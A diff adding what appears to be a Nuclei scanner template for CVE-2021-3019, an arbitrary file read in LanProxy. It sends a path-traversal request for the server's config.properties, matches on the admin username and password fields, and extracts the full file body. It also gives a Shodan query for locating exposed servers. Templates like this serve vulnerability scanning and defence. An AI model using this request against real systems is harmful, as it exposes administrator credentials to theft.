@@ -1,0 +1,41 @@
+id: lanproxy-file-read
+
+info:
+  author: Esonhugh-self-maintained
+  severity: high
+  name: CVE-2021-3019  LanProxy - Arbitrary File Read
+  metadata:
+    cve: CVE-2021-3019
+    verified: "true"
+    shodan-query: http.title:"LanProxy"
+  description: |
+    LanProxy is vulnerable to arbitrary file read via the send malformed request.
+  tags: lfi,lfr
+
+http:
+  - path:
+      - "{{BaseURL}}/../conf/config.properties"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: header
+        words:
+          - "Server: LPS"
+          
+      - type: word
+        condition: and
+        words:
+          - "config.server.username"
+          - "config.server.password"
+          
+    extractors:
+      - type: dsl
+        name: config_content
+        part: body
+        dsl:
+          - "body"
